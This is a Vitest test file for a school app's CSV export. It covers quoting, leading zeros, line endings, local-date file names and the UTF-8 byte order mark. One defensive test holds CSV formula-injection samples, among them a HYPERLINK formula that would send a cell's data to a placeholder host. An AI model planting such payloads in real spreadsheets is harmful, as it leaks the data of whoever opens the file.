import { describe, expect, it, vi } from "vitest";
import { csvBlob, csvName, downloadCsv, toCsv } from "./csv";

describe("toCsv", () => {
  it("writes the header from the column labels, in order", () => {
    const csv = toCsv(
      [{ label: "Alumno", value: (r: { name: string }) => r.name }],
      [{ name: "Valentina Cruz" }],
    );

    expect(csv.split("\r\n")[0]).toBe("Alumno");
  });

  // A pupil called "Cruz, Valentina" would otherwise become two columns, and
  // every row after it in the file would be shifted by one.
  it("quotes a value containing a comma, a quote or a newline", () => {
    const csv = toCsv(
      [{ label: "Nombre", value: (r: { name: string }) => r.name }],
      [{ name: 'Cruz, "Vale"\nSánchez' }],
    );

    expect(csv).toContain('"Cruz, ""Vale""\nSánchez"');
  });

  // Excel reads a bare 0155… as the number 155. Phone numbers, CURPs and folios
  // all lose their leading zeros, and the person who opens the file has no way
  // of knowing.
  it("keeps a leading zero readable as text", () => {
    const csv = toCsv([{ label: "Teléfono", value: () => "0155123456" }], [{}]);

    expect(csv).toContain('="0155123456"');
  });

  // A cell that starts with = + - @ (or a tab/CR) is a FORMULA to Excel. The
  // student import echoes names straight from an uploaded spreadsheet, so
  // =HYPERLINK("http://x/?"&B2) would run in the office's Excel. The apostrophe
  // is Excel's "this is text" mark; plain signed numbers stay numbers.
  it("neutralises a value Excel would run as a formula", () => {
    const rows = ['=HYPERLINK("http://x/?"&B2,"ver")', "+1+1", "@SUM(A1)", "-2+3", "\tcmd", "-150.00", "+52 33"];
    const csv = toCsv([{ label: "Nombre", value: (r: { v: string }) => r.v }], rows.map((v) => ({ v })));
    const cells = csv.split("\r\n").slice(1);

    expect(cells[0]).toBe(`"'=HYPERLINK(""http://x/?""&B2,""ver"")"`);
    expect(cells[1]).toBe("'+1+1");
    expect(cells[2]).toBe("'@SUM(A1)");
    expect(cells[3]).toBe("'-2+3");
    expect(cells[4]).toBe("'\tcmd");
    expect(cells[5]).toBe("-150.00");
    expect(cells[6]).toBe("'+52 33");
  });

  it("writes CRLF line endings, which is what Excel expects", () => {
    const csv = toCsv([{ label: "A", value: () => "1" }], [{}, {}]);

    expect(csv.split("\r\n")).toHaveLength(3);
  });

  it("still writes the header when there is nothing to export", () => {
    expect(toCsv([{ label: "Alumno", value: () => "" }], [])).toBe("Alumno");
  });
});

describe("downloadCsv", () => {
  it("names the file and hands it to the browser once", () => {
    const click = vi.fn();
    const anchor = { click, href: "", download: "", style: {} } as unknown as HTMLAnchorElement;
    vi.spyOn(document, "createElement").mockReturnValue(anchor);
    vi.spyOn(document.body, "appendChild").mockImplementation((n) => n);
    vi.spyOn(document.body, "removeChild").mockImplementation((n) => n);
    const createURL = vi.fn().mockReturnValue("blob:x");
    vi.stubGlobal("URL", { createObjectURL: createURL, revokeObjectURL: vi.fn() });

    downloadCsv("adeudos-2026-10-10.csv", "Alumno\r\nValentina");

    expect(anchor.download).toBe("adeudos-2026-10-10.csv");
    expect(click).toHaveBeenCalledTimes(1);
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });
});

describe("csvName", () => {
  // T5b: the date in the name is the school's day. At 19:00 in Morelia it is
  // already tomorrow in UTC, and an export taken that evening was named with
  // tomorrow's date.
  it("dates the file on Morelia's day, not UTC's", () => {
    const evening15 = new Date("2026-10-16T01:00:00Z"); // 19:00 on the 15th in Morelia
    expect(csvName("alumnos", evening15)).toBe("alumnos-2026-10-15.csv");
  });

  it("turns at Morelia's midnight", () => {
    const midnight16 = new Date("2026-10-16T06:00:00Z"); // 00:00 on the 16th in Morelia
    expect(csvName("alumnos", midnight16)).toBe("alumnos-2026-10-16.csv");
  });
});

// ISSUE-T14-011: Excel on Windows reads a file without the UTF-8 BOM as
// Windows-1252, and "INSCRIPCIÓN" or "Ñ" come out garbled.
describe("csvBlob", () => {
  it("starts with the UTF-8 byte order mark, then the CSV as UTF-8", async () => {
    const bytes = new Uint8Array(await csvBlob("Concepto\r\nINSCRIPCIÓN").arrayBuffer());

    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    expect(new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes.slice(3))).toBe("Concepto\r\nINSCRIPCIÓN");
  });

  it("is typed as UTF-8 CSV", () => {
    expect(csvBlob("a").type).toBe("text/csv;charset=utf-8");
  });
});
